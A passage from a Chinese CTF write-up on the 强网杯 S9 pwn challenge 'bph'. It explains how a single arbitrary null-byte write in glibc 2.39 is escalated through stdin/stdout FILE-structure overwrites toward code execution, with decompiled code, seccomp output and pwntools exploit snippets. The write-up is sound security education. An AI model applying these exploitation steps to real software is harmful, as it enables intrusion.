
# [原创]2025 强网杯S9 pwn - bph 复盘详解：一个任意地址写00到RCE的新技巧

> 文章首发自 先知社区：<mark class="encrypted">ce9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8X3&6W2N6%4y4Q4x3V1j5I4z5e0t1#2z5l9`.`.</mark>

## 前言

pwn的技巧都跟魔法一样，一瞬间，发生了很多事情，如果不了解原理，那真的很难理解了，这里和大家分享一下 强网杯S9 pwn-bph题目的魔法般的技巧（内含`glibc-2.39`源码&反汇编进行辅助讲解）

> xx一把梭搞得很多并不简单的题目分都烂了

## 新技巧简介：单次任意地址写00到RCE

条件：当得到任意地址写00，且程序存在利用`IO_FILE`获取输入的场景时，例如：`fgets`，`fread`等

流程：

1. 可以向`stdin->_IO_buf_base`末位写入00，扩大输入缓冲区以至于能够覆盖`stdin`的输入缓冲区指针

2. 控制输入缓冲区指针指向`stdout`（利用下次输出时候的虚指针调用），或者`stderr`（利用`exit`流程的虚指针调用）

3. 再次输入可以覆盖目标`IO_FILE`结构，为后续利用做准备

4. 利用 `puts`：`_IO_sputn`（`vtable+0x38`）的调用，配合`house of emma` + `house of cat`组合完成控制流劫持

此题目存在沙箱，所以后续还需要进行栈迁移打`ROP`，具体思路就是伪造`IO`结构控制`rdx`，通过`setcontext+61`栈迁移进行`ROP`，`ROP ORW`绕过沙箱读取`flag`

具体流程和分析过程看下面今年强网的题目分析吧

## 题目情况

`glibc 2.39`版本（目前最新的大版本），程序保护全开：

```
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
FORTIFY: Enabled
SHSTK: Enabled
IBT: Enabled
```

存在沙箱：

```
bph\_16458b9d1cc48d68ba00aa2836012b81 ➤ seccomp-tools dump ./chall
line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x00 0x0c 0xc000003e if (A != ARCH\_X86\_64) goto 0014
0002: 0x20 0x00 0x00 0x00000000 A = sys\_number
0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x09 0xffffffff if (A != 0xffffffff) goto 0014
0005: 0x15 0x07 0x00 0x00000000 if (A == read) goto 0013
0006: 0x15 0x06 0x00 0x00000001 if (A == write) goto 0013
0007: 0x15 0x05 0x00 0x00000003 if (A == close) goto 0013
0008: 0x15 0x04 0x00 0x00000009 if (A == mmap) goto 0013
0009: 0x15 0x03 0x00 0x0000000c if (A == brk) goto 0013
0010: 0x15 0x02 0x00 0x0000003c if (A == exit) goto 0013
0011: 0x15 0x01 0x00 0x000000e7 if (A == exit\_group) goto 0013
0012: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0014: 0x06 0x00 0x00 0x00000000 return KILL
```

只能使用`openat`，`read`，`write`这些系统调用

`open`函数内部调用的系统调用就是`openat`：（来自 `glibc-2.39` 源码）

```c
int
\_\_libc\_open (const char \*file, int oflag, ...)
{
int mode = 0;
if (\_\_OPEN\_NEEDS\_MODE (oflag))
{
va\_list arg;
va\_start (arg, oflag);
mode = va\_arg (arg, int);
va\_end (arg);
}
return SYSCALL\_CANCEL (openat, AT\_FDCWD, file, oflag, mode);
}
libc\_hidden\_def (\_\_libc\_open)
```

最终需要通过`open-read-write`完成`flag`的读取

## 逆向分析

`main` 函数：

```c
\_\_int64 \_\_fastcall main(\_\_int64 a1, char \*\*a2, char \*\*a3)
{
char s[40]; // [rsp+0h] [rbp-68h] BYREF
unsigned \_\_int64 v5; // [rsp+28h] [rbp-40h]
v5 = \_\_readfsqword(0x28u);
init(a1, a2, a3);
set\_sandbox();
sub\_1640(); // 可泄露地址
while ( 2 )
{
while ( 1 )
{
puts("");
puts("1) Create note");
puts("2) Edit note");
puts("3) View note");
puts("4) Delete note");
puts("6) Exit");
\_\_printf\_chk(2, "Choice: ");
if ( fgets(s, 32, stdin) ) // fgets
break;
LABEL\_9:
puts("bad choice");
}
switch ( (unsigned int)\_\_isoc23\_strtol(s, 0, 10) )
{
case 1u:
create(); // 任意地址写入00
continue;
case 2u:
sub\_1930(); // 未实现
continue;
case 3u:
\_\_printf\_chk(2, "Index: ");
sub\_1710(); // 未实现
continue;
case 4u:
sub\_1A50(); // 不可用
continue;
case 6u:
puts("bye");
return 0;
default:
goto LABEL\_9;
}
}
}
```

这里`init`函数初始化了2个全局变量：`size`和`ptr`

```c
int init()
{
int result; // eax
setvbuf(stdin, 0, 2, 0);
result = setvbuf(stdout, 0, 2, 0);
size = 0;
ptr = 0;
return result;
}
```

`sub_1640`函数提供了泄露地址的机会：可以利用残留数据泄露地址

```c
unsigned \_\_int64 sub\_1640()
{
char buf[88]; // [rsp+0h] [rbp-68h] BYREF
unsigned \_\_int64 v2; // [rsp+58h] [rbp-10h]
v2 = \_\_readfsqword(0x28u);
puts("=== Tiny Service ===");
\_\_printf\_chk(2, "Please input your token: ");
read(0, buf, 0x50u);
\_\_printf\_chk(2, "Your token is %s.\n", buf);
return v2 - \_\_readfsqword(0x28u);
}
```

功能函数中只有`create`和`delete`实现了，其他两个没实现功能

`create`：读取`size`，申请内存，读取数据，写入末尾的00，设置`ptr`和`dword_4040=1`

假如输入的`size`过大，`malloc`会失败返回0，`read`也会失败，但是 `ptr+size-1=0` 依然会执行，就会对 `size-1=0` 进行赋值，此处存在任意地址写入00字节

```c
int create()
{
\_\_int64 v0; // rax
size\_t size\_1; // rbx
void \*ptr; // rax
size\_t size; // [rsp+0h] [rbp-18h] BYREF
unsigned \_\_int64 v5; // [rsp+8h] [rbp-10h]
v5 = \_\_readfsqword(0x28u);
if ( ptr || dword\_4040 )
{
LODWORD(v0) = puts("No free slots.");
}
else
{
\_\_printf\_chk(2, "Size: ");
\_\_isoc23\_scanf("%zu", &size); // 读取size
getc(stdin);
size\_1 = size;
ptr = malloc(size); // 申请内存
::size = size\_1;
ptr = ptr;
\_\_printf\_chk(2, "Content: ");
read(0, ptr, size); // 读取数据
\*((char \*)ptr + size - 1) = 0; // 写入00
\_\_printf\_chk(2, "Created note %d\n", 0);
dword\_4040 = 1;
return v5 - \_\_readfsqword(0x28u);
}
return v0;
}
```

`delete`：检查`dword_4040`和`ptr`，如果存在`ptr`且`dword_4040=0`，才能执行`free`，这个条件不可能存在，所以可以认为这个函数不存在，不用再看了

```c
int sub\_1A50()
{
char s[40]; // [rsp+0h] [rbp-38h] BYREF
unsigned \_\_int64 v2; // [rsp+28h] [rbp-10h]
v2 = \_\_readfsqword(0x28u);
\_\_printf\_chk(2, "Index: ");
if ( !fgets(s, 32, stdin) || dword\_4040 | (unsigned int)\_\_isoc23\_strtol(s, 0, 10) )
return puts("invalid");
if ( !ptr )
return puts("already empty");
free(ptr);
ptr = 0;
size = 0;
return puts("Deleted (pointer left dangling).");
}
```

## 利用分析

程序逻辑很简单，就一次任意大小分配+末尾写入00字节的功能

分析一下现状：

- `glibc-2.39` 版本，保护全开

- 存在地址泄露，可以泄露`libc`地址

- 存在任意地址写入00字节

- 通过`fgets`读取输入

思路：精准满足3个条件，这里可以用从任意地址写入 00 到 RCE的技巧：

1. 向`stdin`的`IO_FILE`结构体中`_IO_buf_base`末位写入00，就可以在下一次输入的时候，将输入的数据读取到输入缓冲区`base`到`end`的位置上，通过向末位写入00，可以让`base`指针指向更提前的地方，以至于下一次写入能够完整覆盖`_IO_buf_base`和`_IO_buf_end`

2. 下一次写入修改`stdin`的`_IO_buf_base`和`_IO_buf_end`为能够覆盖 `stdout` 结构体的范围，再下一次读取数据便可以完整覆盖`stdout`

3. 利用程序中会调用`puts`函数，`puts`函数会调用 `_IO_sputn`函数指针，通过`house of emma`偏移`vtable`指针的思想，即可通过调整偏移伪造`FILE`结构完成利用

4. 对于沙箱，则通过`setcontext`来绕过即可

### 泄露libc地址过程：

利用残留数据泄露`libc`地址：

```py
payload = cyclic(0x28)
sa(b"token: ",payload)
ru(cyclic(0x28))
leak = r(6).ljust(8,b"\x00")
leak = unpack(leak) - 126
success(f"leak: {hex(leak)}")
libc.address = leak - libc.sym.free
success(f"libc base: {hex(libc.address)}")
```

### 覆盖 stdin->_IO_buf_base 末位地址

通过构造`size = stdin->_IO_buf_base + 1`，进入`create`函数，触发任意地址写00

```py
target = libc.address +0x203918
success(f"target: {hex(target)}")
sla(b"Choice: ",b"1")
sla(b"Size: ",str(target+1).encode())
sa(b": ",b"aaaa")
```

写入00后的`stdin`：这里+0x38处就是`_IO_buf_base`，+0x40处就是`_IO_buf_end`，可以看到，范围从`0x7ffff7f90964`（原本缓冲区就1字节）变到`0x7ffff7f90900~0x7ffff7f90964`，范围刚好覆盖到这个`_IO_buf_base`和`_IO_buf_end`

```
pwndbg> x/40xga &\_IO\_2\_1\_stdin\_
0x7ffff7f908e0 <\_IO\_2\_1\_stdin\_>: 0xfbad20ab 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32>
0x7ffff7f908f0 <\_IO\_2\_1\_stdin\_+16>: 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32> 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32>
0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32>: 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32> 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32>
0x7ffff7f90910 <\_IO\_2\_1\_stdin\_+48>: 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32> 0x7ffff7f90900 <\_IO\_2\_1\_stdin\_+32>
0x7ffff7f90920 <\_IO\_2\_1\_stdin\_+64>: 0x7ffff7f90964 <\_IO\_2\_1\_stdin\_+132> 0x0
0x7ffff7f90930 <\_IO\_2\_1\_stdin\_+80>: 0x0 0x0
0x7ffff7f90940 <\_IO\_2\_1\_stdin\_+96>: 0x0 0x0
0x7ffff7f90950 <\_IO\_2\_1\_stdin\_+112>: 0x0 0xffffffffffffffff
0x7ffff7f90960 <\_IO\_2\_1\_stdin\_+128>: 0xa000000 0x7ffff7f92720 <\_IO\_stdfile\_0\_lock>
0x7ffff7f90970 <\_IO\_2\_1\_stdin\_+144>: 0xffffffffffffffff 0x0
0x7ffff7f90980 <\_IO\_2\_1\_stdin\_+160>: 0x7ffff7f909c0 <\_IO\_wide\_data\_0> 0x0
0x7ffff7f90990 <\_IO\_2\_1\_stdin\_+176>: 0x0 0x0
0x7ffff7f909a0 <\_IO\_2\_1\_stdin\_+192>: 0xffffffff 0x0
0x7ffff7f909b0 <\_IO\_2\_1\_stdin\_+208>: 0x0 0x7ffff7f8f030 <\_IO\_file\_jumps>
```

### 复写 stdin->_IO_buf_base和_IO_buf_end指向stdout

下一次输入的时候，输入缓冲区会从`0x7ffff7f90900`开始，需要伪造`0x7ffff7f90900`开始的数据：

```py
payload = pack(0)\*3 + pack(libc.sym.\_IO\_2\_1\_stdout\_) + pack(libc.sym.\_IO\_2\_1\_stdout\_ + 0x200)
s(payload)
```

这里只用管`_IO_buf_base`和`_IO_buf_end`的值，前面的值会自动更新的，让他刚好覆盖到`stdout`结构体即可，覆盖完之后：
